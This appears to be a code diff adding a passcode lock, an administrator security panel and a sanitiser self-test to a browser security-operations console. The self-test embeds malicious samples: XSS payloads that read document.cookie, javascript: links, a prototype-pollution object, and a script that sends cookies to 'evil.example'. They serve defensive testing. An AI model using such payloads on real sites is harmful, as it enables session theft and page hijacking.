+    $("#sgForgot").onclick = async () => { if (await confirmBox("Reset this console?", "There is no way to recover the passcode. Resetting removes everything this console keeps in this browser — settings, keys, sites you added, logs — and starts fresh. Data on the PSOC server is not affected.")){
+      Object.keys(localStorage).filter(k => k.startsWith("psoc.")).forEach(k => localStorage.removeItem(k)); location.reload(); } }; }
+  el.querySelector(".why").textContent = why || "Enter the passcode to continue."; el.querySelector(".msg").textContent = ""; el.hidden = false;
+  [...document.body.children].forEach(c => { if (c !== el && c.id !== "ov" && c.id !== "toasts") c.inert = true; });
+  document.title = "ITE — locked"; sgLockTick(); setTimeout(() => { const i = $("#sgPass"); if (i){ i.value = ""; i.focus(); } }, 50); }
+function sgLockTick(){ const el = $("#sgLock"); if (!el || el.hidden) return; const now = Date.now(), wait = SGA.until - now;
+  $("#sgPass").disabled = $("#sgGo").disabled = wait > 0; if (wait > 0) el.querySelector(".msg").textContent = `Too many wrong passcodes. Try again in ${Math.ceil(wait / 1000)} s.`;
+  const al = el.querySelector(".sgalert"), qa = typeof currentAlarm !== "undefined" && currentAlarm, n = typeof ATTN !== "undefined" ? ATTN.length : 0;
+  al.hidden = !qa && !n; al.textContent = qa ? "Earthquake alarm active — unlock to see it" : n ? `${n} alert${n === 1 ? "" : "s"} waiting — unlock to see ${n === 1 ? "it" : "them"}` : "";
+  clearTimeout(sgLockTick.t); sgLockTick.t = setTimeout(sgLockTick, 1000); }
+async function sgTryUnlock(){ const el = $("#sgLock"), msg = el.querySelector(".msg"); if (SGA.until > Date.now()) return;
+  const ok = await sgCheckPass($("#sgPass").value);
+  if (ok){ SGA.fails = 0; SGA.until = 0; sgaSave(); SG_LOCKED = false; el.hidden = true; [...document.body.children].forEach(c => c.inert = false); SG_ACT = Date.now(); document.title = "ITE — Intelligence to the Edge";
+    sgLog("access", "", "Unlocked" + (ME ? " by " + ME.name : "")); if (typeof renderAll === "function") try{ renderAll(); }catch(e){} return; }
+  SGA.fails++; if (SGA.fails >= 5) SGA.until = Date.now() + Math.min(30, 2 ** (SGA.fails - 5)) * 60e3; sgaSave();
+  sgLog("access", "", `Wrong passcode (${SGA.fails} in a row)`); msg.textContent = SGA.fails >= 5 ? "" : `Wrong passcode. ${5 - SGA.fails} more tr${5 - SGA.fails === 1 ? "y" : "ies"} before a lock-out.`; $("#sgPass").value = ""; sgLockTick(); }
+["pointerdown", "keydown", "wheel", "touchstart"].forEach(t => addEventListener(t, () => { if (!SG_LOCKED) SG_ACT = Date.now(); }, { passive: true, capture: true }));
+document.addEventListener("visibilitychange", () => { if (document.hidden) SG_HIDDEN_AT = Date.now(); else if (SGA.hash && SG_HIDDEN_AT && Date.now() - SG_HIDDEN_AT > SGA.autolock * 60e3) sgLock("Locked while the console was in the background."); });
+setInterval(() => { if (SGA.hash && SGA.autolock && !SG_LOCKED && Date.now() - SG_ACT > SGA.autolock * 60e3) sgLock(`Locked after ${SGA.autolock} minutes without activity.`); }, 15e3);
+if (SGA.hash) sgLock("Enter the passcode to open the console.");
+function sgLockBtn(){ const t = $("#themeBtn"); let b = $("#lockBtn"); if (!SGA.hash){ if (b) b.remove(); return; } if (!b && t){ t.insertAdjacentHTML("beforebegin", `<button class="pill" id="lockBtn" title="Lock the console now">🔒 Lock</button>`); b = $("#lockBtn"); } if (b) b.onclick = () => sgLock("Locked by " + (ME ? ME.name : "the user") + "."); }
+setTimeout(sgLockBtn, 300);
+if (typeof phMore === "function"){ const _pm = phMore; phMore = function(open){ const r = _pm.apply(this, arguments); if (open && SGA.hash){ const g = [...$$("#pmore .pmg")].pop(); if (g && !g.querySelector("[data-sglock]")) g.insertAdjacentHTML("afterbegin", `<button class="pmt" data-sglock>🔒 Lock now</button>`); } return r; }; }
+document.addEventListener("click", e => { if (e.target.closest("[data-sglock]")){ if (typeof phMore === "function") phMore(false); sgLock("Locked by " + (ME ? ME.name : "the user") + "."); } });
+
+/* ---------- Administrator › Security ---------- */
+{ const a = G("admin"); if (a && !a.tabs.some(t => t[0] === "adm-security")) a.tabs.splice(Math.max(0, a.tabs.findIndex(t => t[0] === "adm-audit")), 0, ["adm-security", "Security"]); }
+KEYS["adm-security"] = ["SECURITY", [], "Security gateways: what comes in from outside, what the page connects to, and who can open it"]; NON_CITY_MODES.push("adm-security");
+function sgSecrets(){ const m = v => v ? String(v).slice(0, 3) + "•••" + String(v).slice(-2) : "";
+  return [["Google Maps / Air quality key", "gKey", CFG.gKey], ["WAQI air-quality token", "waqiToken", CFG.waqiToken], ["Taiwan CWA key", "agency.cwaKey", CFG.agency && CFG.agency.cwaKey], ["Korea KMA key", "agency.kmaKey", CFG.agency && CFG.agency.kmaKey],
+    ["GNews key", "news.gnewsKey", CFG.news && CFG.news.gnewsKey], ["NewsAPI key", "news.newsapiKey", CFG.news && CFG.news.newsapiKey], ["NewsData key", "news.newsdataKey", CFG.news && CFG.news.newsdataKey], ["TheNewsAPI key", "news.thenewsKey", CFG.news && CFG.news.thenewsKey],
+    ["Speech-to-text key", "ltv.tr.key", CFG.ltv && CFG.ltv.tr && CFG.ltv.tr.key], ["Anthropic API key (writing with AI)", "llmw.key", CFG.llmw && CFG.llmw.key], ["AI gateway header value", "llmw.headerValue", CFG.llmw && CFG.llmw.headerValue],
+    ["Lenel OnGuard password", "bau.lenel.pass", BAU.cfg.lenel.pass], ["VMS password", "bau.vms.pass", BAU.cfg.vms.pass]].filter(x => x[2]).map(([l, p, v]) => ({ l, p, mask: m(v) })); }
+function sgChecks(){ const sec = sgSecrets(), lib = ["leaflet", "xlsx"].map(k => !!document.querySelector(`script[data-pin="${k}"][integrity]`)), unap = Object.entries(SG_STATS.hosts).filter(([h, v]) => v.unapproved).length;
+  return [
+    [true, "Inbound data gateway", `Every outside response is checked before use. This session: ${n2(SG_STATS.checked)} checked, ${n2(SG_STATS.cleaned)} cleaned, ${n2(SG_STATS.blocked)} refused.`],
+    [true, "Output guard", `Scripts, plugins, inline event handlers and script links are removed if anything tries to add them${SG_STATS.dom ? ` — ${SG_STATS.dom} removed this session` : " — none needed this session"}.`],
+    [lib.every(Boolean) && (window.L || window.XLSX) ? true : lib.some(Boolean) ? null : false, "Library fingerprints", lib.every(Boolean) ? "Leaflet and SheetJS load only if they match their pinned SHA-384 fingerprint; libraries loaded on demand (video, slides, camera AI) are pinned too. The speech model library (transformers.js) is not pinned." : "The map and spreadsheet libraries are loaded without fingerprints."],
+    [true, "Content Security Policy", `Scripts only from this page and the library CDNs; plugins and foreign base addresses blocked.${SG.mode === "enforce" ? " Connections, images, video and frames only to approved hosts." : ""}`],
+    [SG.mode === "enforce" ? true : null, "Connection gateway", SG.mode === "enforce" ? `Enforce: only approved hosts can be reached${SG.block.length ? `; ${SG.block.length} blocked by you` : ""}.` : `Monitor: every host is listed and checked, but not-approved hosts are still allowed${unap ? ` (${unap} seen this session)` : ""}. Switch to Enforce once the list looks right.`],
+    [SGA.hash ? true : false, "Access gateway (passcode)", SGA.hash ? `Passcode required to open the console; auto-lock after ${SGA.autolock || "—"} min idle; lock-out after 5 wrong tries.` : "Anyone who can open this page on this computer can use the console. Set a passcode below."],
+    [location.protocol === "https:" ? true : location.protocol === "file:" ? null : false, "Secure connection", location.protocol === "https:" ? "Served over HTTPS." : location.protocol === "file:" ? "Opened from a file on this computer — no network to intercept, but no central updates either." : "Served over plain HTTP — anyone on the network could alter the page. Serve it over HTTPS."],
+    [sec.length ? false : true, "Keys and passwords in this browser", sec.length ? `${sec.length} stored in this browser, readable by anyone using this browser profile. Move them to the PSOC server where possible.` : "None stored in this browser."],
+    [CFG.llmw && CFG.llmw.redact === false ? false : true, "Site details sent to AI models", CFG.llmw && CFG.llmw.redact === false ? "Site codes and names are sent to the model as written." : "Site codes and names are replaced with SITE-1, SITE-2 … before anything is sent to a model."],
+    [serverBase() ? true : null, "Shared server", serverBase() ? "Shared data and system passwords stay on the PSOC server." : "Local mode: data stays in this browser; system passwords (Lenel, VMS) would be stored here if set."],
+    [!!document.querySelector('meta[name="robots"][content*="noindex"]'), "Search engines", "The page asks search engines not to index it."]]; }
+function sgPanel(){ const ch = sgChecks(), pass = ch.filter(c => c[0] === true).length, tab = UI.sgTab || "overview", sec = sgSecrets();
+  const icon = v => v === true ? `<span class="sgok">✓</span>` : v === false ? `<span class="sgbad">!</span>` : `<span class="sgwarn">–</span>`;
+  const hosts = Object.entries(SG_STATS.hosts).map(([h, v]) => ({ h, v, cat: sgCat(h), ok: sgApproved(h), bl: sgMatch(h, SG.block) })).sort((a, b) => (b.v.blocked + b.v.cleaned) - (a.v.blocked + a.v.cleaned) || a.ok - b.ok || b.v.n - a.v.n);
+  const tabs = [["overview", "Overview"], ["inbound", "Inbound data"], ["hosts", "Connections"], ["access", "Access"], ["secrets", "Keys & data"], ["log", "Security log"]];
+  let body = "";
+  if (tab === "overview") body = `<div class="sgscore"><b>${pass}</b><span>of ${ch.length} checks pass</span><button class="act" data-sgtest>Run the gateway self-test</button><button class="act" data-sgreport>Copy security report</button></div>
+    <div class="sgchecks">${ch.map(([v, t, d]) => `<div class="sgc">${icon(v)}<div><b>${esc(t)}</b><div class="s">${esc(d)}</div></div></div>`).join("")}</div><div id="sgTestOut"></div>`;
+  if (tab === "inbound") body = `<p class="help" style="margin-top:0">Before any outside data reaches the console, the gateway refuses executable content and anything larger than <input type="number" min="1" max="200" data-sgmax value="${SG.maxMB}" style="width:64px"> MB, then cleans what is left: JSON is parsed and every text value cleaned; XML, RSS, CAP, HTML and plain text are cleaned as text (HTML pages keep their text, but scripts are made inert). Removed: script blocks, frames and plugins, inline event handlers, javascript:/vbscript:/data:text/html links, and keys that could tamper with the page's objects (__proto__). Nothing from the response is stored here — only what was removed and from where (addresses are logged without their query, which can hold keys).</p>
+    <div class="stats"><span class="stat"><b>${n2(SG_STATS.checked)}</b>Responses checked</span><span class="stat${SG_STATS.cleaned ? " over" : ""}"><b>${n2(SG_STATS.cleaned)}</b>Cleaned</span><span class="stat${SG_STATS.blocked ? " over" : ""}"><b>${n2(SG_STATS.blocked)}</b>Refused</span><span class="stat"><b>${n2(SG_STATS.dom)}</b>Removed from the page</span></div>
+    <div class="tbl"><table class="acc"><thead><tr><th>Source</th><th>Purpose</th><th class="num">Checked</th><th class="num">Cleaned</th><th class="num">Refused</th><th>What was removed</th><th>Last</th></tr></thead><tbody>${hosts.filter(x => x.v.n || x.v.blocked).map(x => `<tr><td><b>${esc(x.h)}</b></td><td>${esc(x.cat)}</td><td class="num">${n2(x.v.n)}</td><td class="num">${x.v.cleaned || ""}</td><td class="num">${x.v.blocked || ""}</td><td class="s">${esc(Object.entries(x.v.finds).map(([k, c]) => c + " " + k).join(", "))}</td><td class="s nowrap">${x.v.last ? esc(ago(x.v.last)) : ""}</td></tr>`).join("") || `<tr><td colspan="7" class="s">No outside data fetched yet in this session.</td></tr>`}</tbody></table></div>
+    <div class="acts" style="margin-top:10px"><button class="act" data-sgtest>Run the gateway self-test</button></div><div id="sgTestOut"></div>`;
+  if (tab === "hosts") body = `<div class="sgmode"><b>Connection gateway</b>${["monitor", "enforce"].map(m => `<button class="tab-mini" data-sgmode="${m}" aria-pressed="${SG.mode === m}">${m === "monitor" ? "Monitor" : "Enforce"}</button>`).join("")}<span class="s">${SG.mode === "enforce" ? "Only approved hosts can be reached. Changes apply after a reload." : "Every host is listed and its data checked; not-approved hosts are allowed but flagged."}</span></div>
+    <p class="help">Approved by default: the ${SG_KNOWN.length + SG_EXTRA.length} services the console is built to use, and any server or feed an administrator has entered in Settings or Integrations. Block a host to stop the console talking to it at all.</p>
+    <div class="tbl"><table class="acc"><thead><tr><th>Host</th><th>Purpose</th><th>Status</th><th class="num">Requests</th><th></th></tr></thead><tbody>${hosts.map(x => `<tr><td><b>${esc(x.h)}</b></td><td>${esc(x.cat)}</td><td>${x.bl ? `<span class="sgbad">Blocked</span>` : x.ok ? `<span class="sgok">Approved</span>` : `<span class="sgwarn">Not approved</span>`}</td><td class="num">${n2(x.v.n)}</td>
+      <td class="nowrap">${x.bl ? `<button class="act" data-sgunblock="${esc(x.h)}">Unblock</button>` : `${x.ok ? "" : `<button class="act" data-sgapprove="${esc(x.h)}">Approve</button> `}<button class="act warn" data-sgblock="${esc(x.h)}">Block</button>`}</td></tr>`).join("") || `<tr><td colspan="5" class="s">No connections yet in this session.</td></tr>`}</tbody></table></div>
+    ${SG.block.length || SG.approve.length ? `<div class="s" style="margin-top:8px">${SG.block.length ? "Blocked by you: " + SG.block.map(esc).join(", ") + ". " : ""}${SG.approve.length ? "Approved by you: " + SG.approve.map(esc).join(", ") + "." : ""}</div>` : ""}
+    <label class="fld" style="max-width:420px;margin-top:10px">Block or approve a host<input id="sgHostIn" placeholder="e.g. tracker.example.com or *.example.com"></label><div class="acts"><button class="act warn" data-sgaddblock>Block</button><button class="act" data-sgaddapprove>Approve</button></div>`;
+  if (tab === "access") body = SGA.hash ? `<div class="sgc">${icon(true)}<div><b>Passcode is on</b><div class="s">Required every time the console opens, after ${SGA.autolock || "no"} minutes without activity, and when it has been in the background that long. Five wrong passcodes lock it for 1 minute, doubling up to 30 minutes.</div></div></div>
+      <div class="fgrid" style="max-width:640px;margin-top:10px"><label class="fld">Auto-lock after (minutes, 0 = never)<input type="number" min="0" max="240" id="sgAuto" value="${SGA.autolock}"></label></div>
+      <div class="fgrid" style="max-width:640px"><label class="fld">Current passcode<input type="password" id="sgCur" autocomplete="current-password"></label><label class="fld">New passcode (leave empty to keep)<input type="password" id="sgNew" autocomplete="new-password"></label><label class="fld">Repeat new passcode<input type="password" id="sgNew2" autocomplete="new-password"></label></div>
+      <div class="acts"><button class="act on" data-sgsave>Save</button><button class="act" data-sglock>🔒 Lock now</button><button class="act warn" data-sgoff>Turn the passcode off</button></div><div class="s sgmsg"></div>`
+    : `<div class="sgc">${icon(false)}<div><b>No passcode</b><div class="s">Anyone who can open this page on this computer can use the console. A passcode locks it when it opens, when idle and on demand. It is stored only as a salted PBKDF2-SHA-256 hash (310,000 rounds) and cannot be recovered — if it is forgotten, the console in this browser has to be reset.</div></div></div>
+      <div class="fgrid" style="max-width:640px;margin-top:10px"><label class="fld">Passcode (at least 8 characters)<input type="password" id="sgNew" autocomplete="new-password"></label><label class="fld">Repeat passcode<input type="password" id="sgNew2" autocomplete="new-password"></label><label class="fld">Auto-lock after (minutes)<input type="number" min="0" max="240" id="sgAuto" value="${SGA.autolock || 15}"></label></div>
+      <div class="acts"><button class="act on" data-sgsave>Turn the passcode on</button></div><div class="s sgmsg"></div>
+      <p class="help">This protects the console on a shared or unattended computer. For proper sign-in (company accounts, MFA), put the page behind your identity gateway, for example Microsoft Entra application proxy or Cloudflare Access, or run the PSOC server with single sign-on.</p>`;
+  if (tab === "secrets") body = `<p class="help" style="margin-top:0">These keys and passwords are kept in this browser's storage. The gateway never logs them (addresses are logged without their query), but anyone using this browser profile could read them. Remove what you no longer need; keep system passwords on the PSOC server.</p>
+    <div class="tbl"><table class="acc"><thead><tr><th>What</th><th>Stored value</th><th></th></tr></thead><tbody>${sec.map(x => `<tr><td>${esc(x.l)}</td><td class="num">${esc(x.mask)}</td><td><button class="act warn" data-sgdelkey="${esc(x.p)}">Remove</button></td></tr>`).join("") || `<tr><td colspan="3" class="s">No keys or passwords stored in this browser.</td></tr>`}</tbody></table></div>
+    <div class="sec" style="margin-top:14px">Data this console keeps in this browser</div><div class="s">${(() => { let n = 0, b = 0; try{ Object.keys(localStorage).filter(k => k.startsWith("psoc.")).forEach(k => { n++; b += (localStorage.getItem(k) || "").length * 2; }); }catch(e){} return `${n} stores, about ${(b / 1048576).toFixed(1)} MB.`; })()} Nothing is sent anywhere unless a PSOC server is set under Integrations.</div>`;
+  if (tab === "log") body = `<div class="acts" style="margin:0 0 8px"><button class="act" data-sgclearlog>Clear the security log</button></div><div class="tbl"><table class="acc"><thead><tr><th>When</th><th>Gateway</th><th>Source</th><th>What happened</th></tr></thead><tbody>${SG_LOG.slice(0, 200).map(x => `<tr><td class="nowrap s">${esc(sgt(x.t))}</td><td>${esc({ cleaned: "Inbound data", blocked: "Connection", csp: "Content policy", dom: "Output guard", access: "Access", info: "Libraries", config: "Settings" }[x.kind] || x.kind)}</td><td>${esc(x.host || "")}${x.path ? `<div class="s">${esc(x.path)}</div>` : ""}</td><td>${esc(x.msg)}${x.n > 1 ? ` <span class="s">×${x.n}</span>` : ""}</td></tr>`).join("") || `<tr><td colspan="4" class="s">Nothing yet.</td></tr>`}</tbody></table></div>`;
+  return `<div class="ptools"><span class="label">Security</span><span class="ctl">${pass} of ${ch.length} checks pass</span><span class="sp"></span>${SGA.hash ? `<button class="tab-mini" data-sglock>🔒 Lock now</button>` : ""}</div>
+    <div class="pbody sgpage"><div class="sgtabs" role="tablist">${tabs.map(([k, l]) => `<button role="tab" data-sgtab="${k}" aria-selected="${tab === k}">${l}</button>`).join("")}</div>${body}</div>`; }
+{ const _rpi = renderPanelInner; renderPanelInner = function(p){ if (UI.mode === "adm-security"){ if (!can("admin")){ p.innerHTML = `<div class="pbody"><div class="empty">Administrators only.</div></div>`; return; } p.innerHTML = sgPanel(); return; } return _rpi(p); }; }
+// the self-test: real malicious samples through the same inspection the network data goes through
+async function sgSelfTest(){ const samples = [
+  ["JSON with an image that runs code", "application/json", JSON.stringify({ title: 'Flood warning <img src=x onerror="alert(document.cookie)">', link: "javascript:alert(1)" })],
+  ["JSON trying to change the page's objects", "application/json", '{"__proto__":{"isAdmin":true},"area":"Tokyo"}'],
+  ["RSS with an embedded script", "application/rss+xml", '<?xml version="1.0"?><rss><channel><item><title>Protest</title><description><![CDATA[Crowd <script>fetch("https://evil.example/steal?c="+document.cookie)<\/script> gathering]]></description></item></channel></rss>'],
+  ["RSS with an encoded script", "application/rss+xml", '<rss><item><description>&lt;script&gt;alert(1)&lt;/script&gt;Road closed &lt;a href="#" onclick="alert(2)"&gt;map&lt;/a&gt;</description></item></rss>'],
+  ["HTML page with a frame and handler", "text/html", '<html><body><iframe srcdoc="<script>alert(1)<\/script>"></iframe><a href="javascript:alert(1)">x</a><div onmouseover="alert(1)">hi</div><script>alert(2)<\/script></body></html>'],
+  ["Executable script disguised as a feed", "application/javascript", "alert(document.cookie)"]];
+  const rows = [], keep = { checked: SG_STATS.checked, cleaned: SG_STATS.cleaned, blocked: SG_STATS.blocked, dom: SG_STATS.dom }, logLen = SG_LOG.length, logTop = SG_LOG[0];
+  for (const [label, ct, body] of samples){ const before = SG_STATS.cleaned, beforeB = SG_STATS.blocked;
+    try{ const r = await sgInspect(new Response(body, { status: 200, headers: { "content-type": ct } }), "https://selftest.ite.invalid/feed"); const t = await r.text();
+      const left = /<script(?![^>]*text\/x-ite-inert)|onerror=|onclick=|onmouseover=|javascript:|srcdoc|"__proto__"|&lt;script/i.test(t);
+      rows.push([label, left ? false : true, left ? "Something got through" : SG_STATS.cleaned > before ? "Cleaned" : "Nothing to clean", t.slice(0, 140)]); }
+    catch(e){ rows.push([label, SG_STATS.blocked > beforeB, "Refused", e.message]); } }
+  delete SG_STATS.hosts["selftest.ite.invalid"];
+  // the output guard: try to add a handler and a script to the page
+  const probe = document.createElement("div"); probe.innerHTML = `<img src="data:," onerror="window.__sgx=1"><a href="javascript:void(0)">x</a>`; document.body.appendChild(probe);
+  await new Promise(r => setTimeout(r, 60)); const img = probe.querySelector("img"), a = probe.querySelector("a");
+  rows.push(["Page: element with an inline handler", !img.hasAttribute("onerror") && !window.__sgx, !img.hasAttribute("onerror") ? "Handler removed before it ran" : "Handler still present", ""]);
+  rows.push(["Page: script link", a.getAttribute("href") === "#", a.getAttribute("href") === "#" ? "Link neutralised" : "Link still active", ""]); probe.remove();
+  Object.assign(SG_STATS, keep); SG_LOG = SG_LOG.filter(x => x.host !== "selftest.ite.invalid" && !(x.kind === "dom" && x.t > Date.now() - 5000));
+  const ok = rows.every(r => r[1]); sgLog("info", "", `Gateway self-test: ${rows.filter(r => r[1]).length} of ${rows.length} passed`);
+  const out = $("#sgTestOut"); if (out) out.innerHTML = `<div class="sec" style="margin-top:14px">Self-test ${ok ? `<span class="sgok">all ${rows.length} passed</span>` : `<span class="sgbad">${rows.filter(r => !r[1]).length} failed</span>`}</div>
+    <div class="tbl"><table class="acc"><thead><tr><th>Malicious sample</th><th>Result</th><th>What the console received</th></tr></thead><tbody>${rows.map(r => `<tr><td>${esc(r[0])}</td><td>${r[1] ? `<span class="sgok">✓ ${esc(r[2])}</span>` : `<span class="sgbad">✗ ${esc(r[2])}</span>`}</td><td class="s"><code>${esc(r[3])}</code></td></tr>`).join("")}</tbody></table></div>`; return rows; }
+document.getElementById("panel").addEventListener("click", async e => { const t = e.target.closest("[data-sgtab],[data-sgtest],[data-sgreport],[data-sgmode],[data-sgblock],[data-sgunblock],[data-sgapprove],[data-sgaddblock],[data-sgaddapprove],[data-sgsave],[data-sgoff],[data-sgdelkey],[data-sgclearlog]"); if (!t) return; const d = t.dataset;
+  if (d.sgtab){ UI.sgTab = d.sgtab; saveUI(); renderPanel(); return; }
+  if (d.sgtest !== undefined){ t.disabled = true; await sgSelfTest(); t.disabled = false; return; }
+  if (d.sgreport !== undefined){ const ch = sgChecks(); const txt = `ITE security report — ${sgt(Date.now())}\n${ch.filter(c => c[0] === true).length} of ${ch.length} checks pass\n\n` + ch.map(([v, tt, dd]) => `${v === true ? "PASS" : v === false ? "FAIL" : "NOTE"}  ${tt}: ${dd}`).join("\n") + `\n\nThis session: ${SG_STATS.checked} responses checked, ${SG_STATS.cleaned} cleaned, ${SG_STATS.blocked} refused, ${SG_STATS.dom} removed from the page.`;
+    try{ await navigator.clipboard.writeText(txt); toast("Security report copied", "", "var(--green)"); }catch(err){ toast("Security report", txt.slice(0, 200), "var(--teal)"); } return; }
+  if (d.sgmode){ SG.mode = d.sgmode; sgSave(); sgLog("config", "", "Connection gateway set to " + d.sgmode + (ME ? " by " + ME.name : "")); if (ME) audit("Security: connection gateway " + d.sgmode, "", "");
+    renderPanel(); if (await confirmBox("Reload to apply?", d.sgmode === "enforce" ? "Enforce mode applies the approved-host list to every connection, image, video and frame after a reload." : "Monitor mode applies after a reload.")) location.reload(); return; }
+  const host = d.sgblock || d.sgunblock || d.sgapprove || ((d.sgaddblock !== undefined || d.sgaddapprove !== undefined) && ($("#sgHostIn").value || "").trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, ""));
+  if (host !== undefined && host !== false && (d.sgblock || d.sgunblock || d.sgapprove || d.sgaddblock !== undefined || d.sgaddapprove !== undefined)){ if (!host || !/^(\*\.)?[a-z0-9.-]+\.[a-z]{2,}$/.test(host)){ toast("Enter a host name", "e.g. tracker.example.com or *.example.com", "var(--amber)"); return; }
+    if (d.sgblock || d.sgaddblock !== undefined){ SG.block = [...new Set(SG.block.concat(host))]; SG.approve = SG.approve.filter(x => x !== host); }
+    if (d.sgunblock) SG.block = SG.block.filter(x => x !== host);
+    if (d.sgapprove || d.sgaddapprove !== undefined){ SG.approve = [...new Set(SG.approve.concat(host))]; SG.block = SG.block.filter(x => x !== host); }
+    sgSave(); const what = d.sgunblock ? "unblocked" : d.sgapprove || d.sgaddapprove !== undefined ? "approved" : "blocked"; sgLog("config", host, `Host ${what}${ME ? " by " + ME.name : ""}`); if (ME) audit("Security: host " + what, host, ""); renderPanel(); return; }
+  if (d.sgsave !== undefined){ const msg = $(".sgmsg"), nw = ($("#sgNew") || {}).value || "", nw2 = ($("#sgNew2") || {}).value || "", auto = Math.max(0, Math.min(240, +($("#sgAuto") || {}).value || 0));
+    if (!window.crypto || !crypto.subtle){ msg.textContent = "This browser cannot hash a passcode here (it needs HTTPS)."; return; }
+    if (SGA.hash && !(await sgCheckPass(($("#sgCur") || {}).value || ""))){ msg.textContent = "The current passcode is wrong."; return; }
+    if (nw || !SGA.hash){ if (nw.length < 8){ msg.textContent = "Use at least 8 characters."; return; } if (nw !== nw2){ msg.textContent = "The two passcodes do not match."; return; } await sgSetPass(nw); }
+    SGA.autolock = auto; sgaSave(); sgLog("access", "", (nw ? "Passcode set" : "Auto-lock changed") + (ME ? " by " + ME.name : "")); if (ME) audit("Security: " + (nw ? "passcode set" : "auto-lock " + auto + " min"), "", ""); sgLockBtn(); renderPanel(); toast("Saved", nw ? "The console now needs the passcode to open." : "Auto-lock: " + (auto ? auto + " minutes" : "off"), "var(--green)"); return; }
+  if (d.sgoff !== undefined){ const msg = $(".sgmsg"); if (!(await sgCheckPass(($("#sgCur") || {}).value || ""))){ msg.textContent = "Enter the current passcode to turn it off."; return; }
+    Object.assign(SGA, { hash: null, salt: null, fails: 0, until: 0 }); sgaSave(); sgLog("access", "", "Passcode turned off" + (ME ? " by " + ME.name : "")); if (ME) audit("Security: passcode turned off", "", ""); sgLockBtn(); renderPanel(); return; }
+  if (d.sgdelkey){ if (!(await confirmBox("Remove this key?", "Features that use it will stop working until it is entered again."))) return; const p = d.sgdelkey;
+    if (p.startsWith("bau.")){ const [, sys, f] = p.split("."); BAU.cfg[sys][f] = ""; lsSet("psoc.uni.bau.v1", BAU.cfg); }
+    else { const parts = p.split("."); let o = CFG; parts.slice(0, -1).forEach(k => o = o[k] || {}); o[parts[parts.length - 1]] = ""; saveCfg(); }
+    sgLog("config", "", "Removed a stored key: " + p + (ME ? " by " + ME.name : "")); if (ME) audit("Security: key removed", p, ""); renderPanel(); return; }
+  if (d.sgclearlog !== undefined && await confirmBox("Clear the security log?", "")){ SG_LOG = []; lsSet(SG_LOG_KEY, SG_LOG); renderPanel(); } });
+document.getElementById("panel").addEventListener("change", e => { if (e.target.matches("[data-sgmax]")){ SG.maxMB = Math.max(1, Math.min(200, +e.target.value || 25)); sgSave(); sgLog("config", "", "Largest accepted response set to " + SG.maxMB + " MB"); } });
+{ const st = document.createElement("style"); st.textContent = `
+#sgLock{position:fixed;inset:0;z-index:4000;background:var(--bg);display:flex;align-items:center;justify-content:center;padding:20px}#sgLock[hidden]{display:none}
+#sgLock .in{display:flex;flex-direction:column;align-items:center;gap:10px;width:min(360px,100%);text-align:center}#sgLock h2{margin:4px 0 0;font-size:22px}#sgLock .why{margin:0;color:var(--muted)}
+#sgLock input{width:100%;height:44px;border-radius:10px;border:1px solid var(--line);background:var(--panel);color:var(--text);padding:0 14px;font-size:17px;text-align:center;letter-spacing:2px}
+#sgLock .pill.primary{width:100%;height:44px;font-size:15px}#sgLock .msg{min-height:1.4em;margin:0;color:#F07A86}.sgalert{background:#C4314B;color:#fff;border-radius:8px;padding:8px 12px;font-weight:700;width:100%}
+.sgscore{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin:6px 0 14px}.sgscore b{font-size:34px;line-height:1}.sgscore span{color:var(--muted);margin-right:auto}
+.sgchecks{display:grid;grid-template-columns:repeat(auto-fit,minmax(340px,1fr));gap:8px}.sgc{display:flex;gap:10px;align-items:flex-start;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:10px 12px}.sgc .s{margin-top:2px;line-height:1.45}
+.sgok,.sgbad,.sgwarn{display:inline-flex;align-items:center;justify-content:center;font-weight:800;border-radius:10px;padding:0 7px;min-width:20px;height:20px;font-size:12px;flex:none}
+.sgok{background:color-mix(in srgb,#2FB170 22%,transparent);color:#5CD17A}.sgbad{background:color-mix(in srgb,#E5484D 22%,transparent);color:#F07A86}.sgwarn{background:color-mix(in srgb,#E8C547 22%,transparent);color:#E8C547}
+body.light .sgok{color:#1E7D45}body.light .sgbad{color:#B4232A}body.light .sgwarn{color:#8A6D00}
+.sgtabs{display:flex;flex-wrap:wrap;gap:2px;margin:0 0 14px;padding:3px;border:1px solid var(--line);border-radius:8px;background:var(--panel);width:fit-content;max-width:100%}
+.sgtabs button{border:0;background:transparent;color:var(--muted);font:650 12.5px var(--font);padding:6px 13px;border-radius:6px;cursor:pointer}.sgtabs button:hover{color:var(--text)}.sgtabs button[aria-selected="true"]{background:var(--teal);color:#0B1417}
+.sgpage table.acc{width:100%;border-collapse:collapse;font-size:12.5px}.sgpage table.acc th{text-align:left;padding:7px 10px;border-bottom:1px solid var(--line);color:var(--muted);font-weight:700;font-size:11.5px;text-transform:uppercase;letter-spacing:.3px}
+.sgpage table.acc td{padding:7px 10px;border-bottom:1px solid var(--line);vertical-align:top}.sgpage table.acc .num{text-align:right}.sgpage code{white-space:pre-wrap;word-break:break-all;font-size:11.5px}.sgpage .help{line-height:1.5;max-width:1000px}.sgmode{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-bottom:8px}.sgmode .s{margin-left:6px}.sgmsg{color:#F07A86;margin-top:6px;min-height:1.2em}`; document.head.appendChild(st); }
 
 
 boot();
